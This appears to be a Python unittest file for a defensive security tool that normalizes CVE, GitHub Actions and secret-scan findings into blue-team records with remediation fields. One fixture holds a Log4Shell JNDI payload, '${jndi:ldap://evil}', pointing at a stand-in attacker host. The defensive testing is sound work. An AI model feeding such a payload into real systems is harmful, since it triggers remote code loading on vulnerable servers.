"""
Tests for the shared normalizer — the glue we both depend on.

If Action/Do NOT disappear from historical or GHA output, these fail on purpose.
"""

from __future__ import annotations

import unittest

from correlator.normalize import (
    normalize_gha,
    normalize_go_guard,
    normalize_historical,
    require_blue_team_fields,
)


class TestNormalize(unittest.TestCase):
    def test_historical_has_blue_team_fields(self):
        # Minimal intel row — playbook for Log4Shell lives in normalize map
        row = {
            "id": "CVE-2021-44228",
            "description": "Log4Shell",
            "severity": "CRITICAL",
            "attack_chain": ["log", "jndi", "rce"],
            "example_payload": "${jndi:ldap://evil}",
            "affected_products": ["log4j"],
        }
        d = normalize_historical(row)
        missing = require_blue_team_fields(d)
        self.assertEqual(missing, [], msg=f"missing fields: {missing}")
        # Log4Shell playbook must mention upgrade/patch — we maintain this together
        self.assertRegex(d["action"].lower(), r"upgrade|patch|log4j")
        self.assertTrue(d["do_not"])
        self.assertEqual(d["category"], "historical")

    def test_historical_shiny_tags(self):
        # SHINY-* ids should get shiny/saas tags for --filter / --shiny-only
        d = normalize_historical(
            {
                "id": "SHINY-2026-AURA",
                "description": "Aura guest",
                "severity": "CRITICAL",
            }
        )
        self.assertIn("shiny", d["tags"])
        self.assertIn("guest", d["action"].lower() + d["do_not"].lower())

    def test_gha_has_blue_team_fields(self):
        d = normalize_gha(
            {
                "workflow": ".github/workflows/x.yml",
                "risks": ["Raw issue body piped into AI"],
                "severity": "CRITICAL",
                "recommendation": "Pin action",
            }
        )
        self.assertEqual(require_blue_team_fields(d), [])
        self.assertEqual(d["category"], "gha")
        # Do NOT is part of the operator contract
        self.assertTrue(d["do_not"].lower().startswith("do not"))

    def test_go_guard_normalize(self):
        d = normalize_go_guard(
            {
                "id": "SECRET-1",
                "severity": "HIGH",
                "description": "possible token",
                "file": "x.env",
                "recommendation": "rotate",
            }
        )
        self.assertEqual(require_blue_team_fields(d), [])
        self.assertEqual(d["action"], "rotate")


if __name__ == "__main__":
    unittest.main()
